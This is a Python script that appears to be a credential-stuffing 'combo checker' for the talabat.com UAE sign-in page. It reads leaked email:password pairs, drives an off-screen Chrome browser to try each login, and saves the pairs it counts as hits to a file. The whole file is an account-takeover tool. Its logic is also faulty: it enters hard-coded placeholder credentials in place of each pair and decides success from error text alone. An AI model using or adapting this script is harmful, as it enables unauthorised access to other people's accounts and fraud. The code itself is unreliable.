import os
global combo_file
try:
    from selenium.webdriver.common.by import By
    from selenium import webdriver
    import speedtest
except ImportError:
    print("[+] Libs Not Found Installing Now ...")
    os.system("pip install selenium")
    os.system("pip install speedtest-cli")
    print("[+] Done Installing The Libs .")
    from selenium.webdriver.common.by import By
    from selenium import webdriver
    import speedtest
try:
    combo_file = open(input("Enter Combo Name : ").replace(".txt","")+".txt","r+",encoding="utf-8").read().splitlines()
except FileNotFoundError:
    print("[+] File Not Found Check The Name (:")
except:
    print("[+] Error When Opening The File (:")
Hits = 0
Bad = 0
speed_test = speedtest.Speedtest()
def bytes_to_mb(bytes):
  KB = 1024
  MB = KB * 1024
  return int(bytes/MB)
download_speed = bytes_to_mb(speed_test.download())
if download_speed <5:
    print("Your Download speed is", download_speed, "MB. You may encounter problems and slowness due to the weak internet")
for account in combo_file:
    global Email,Password
    try:
        Email = account.split(":")[0]
        Password = account.split(":")[1]
        browser = webdriver.Chrome()
        browser.set_window_position(-10000,0)
        g = browser.get("https://www.talabat.com/uae/signin")
        username = browser.find_element("name", "username")
        password = browser.find_element("name", "password")
        submit = browser.find_element(By.CSS_SELECTOR,
                                      "#__next > div:nth-child(4) > div.globalstyles__GlobalContainer-sc-fulyk5-0.beagJX > div > div > div > div > div > div > form > button")
        username.send_keys("kl9dfgjdfg@gmail.com")
        password.send_keys("dsfjdsfdsf")
        h = submit.click()
        error_message = "There is no account registered with that email. Please enter a registered email or continue to Create an account"
        while True:
            try:
                errors = browser.find_elements(By.XPATH,
                                               "/html/body/div/div[4]/div[1]/div/div/div/div/div/div/div[3]/div/span")
                if errors[0].text != "":
                    if errors[0].text != error_message:
                        print(f"[{Hits}] Login successful | {Email}:{Password}")
                        open("Hits.txt", "a+", encoding="utf-8").write(f"{Email}:{Password}\n")
                        Hits += 1
                        break
                    if errors[0].text == error_message:
                        print(f"[{Bad}] Login failed")
                        Bad += 1
                        break
            except:
                pass
        browser.close()
    except Exception as error:
        print(f"[+] Skip This Account ({Email}:{Password}) Bcz This Error > {error}")